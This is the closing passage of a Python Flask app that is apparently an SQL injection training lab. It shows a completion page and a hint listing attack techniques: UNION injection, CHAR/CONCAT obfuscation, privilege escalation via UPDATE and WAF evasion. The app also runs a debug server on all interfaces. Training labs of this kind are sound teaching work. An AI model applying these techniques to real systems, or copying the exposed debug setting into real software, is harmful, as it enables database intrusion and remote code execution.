        <div style="background: #fff3cd; border: 2px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3>🎓 PROFESSIONAL CERTIFICATION READY</h3>
            <p>You have successfully demonstrated mastery of:</p>
            <ul>
                <li><strong>10 Progressive SQL Injection Levels</strong></li>
                <li><strong>15+ Unique Attack Techniques</strong></li>
                <li><strong>Advanced Penetration Testing Methodology</strong></li>
                <li><strong>Real-World APT Simulation</strong></li>
            </ul>
            
            <p><strong>Career Applications:</strong></p>
            <ul>
                <li>Professional Penetration Tester</li>
                <li>Red Team Security Specialist</li>
                <li>Application Security Engineer</li>
                <li>Security Consultant</li>
                <li>Cybersecurity Researcher</li>
            </ul>
        </div>

        <div style="text-align: center; margin: 30px 0;">
            <button onclick="location.href='/'" style="background: #28a745; color: white; padding: 20px 40px; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold;">🏠 Return to Portfolio Home</button>
            <button onclick="location.href='/level/1'" style="background: #007bff; color: white; padding: 20px 40px; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold; margin-left: 10px;">🔄 Master All Levels Again</button>
        </div>
        """, techniques=techniques_used)
    else:
        return render_template_string("""
        <h1>⚠️ Advanced Exploitation Incomplete</h1>
        <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px;">
            <h3>Techniques Detected:</h3>
            {% for technique in techniques %}
            <p>✅ {{ technique }}</p>
            {% endfor %}
            
            <p><strong>Required:</strong> Demonstrate at least 4 different SQL injection techniques in your payload</p>
            <p><strong>Hint:</strong> Combine UNION injection, obfuscation (CHAR/CONCAT), privilege escalation (UPDATE), and WAF evasion techniques</p>
        </div>
        <a href="/level/10">🔄 Try Again</a>
        """, techniques=techniques_used)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)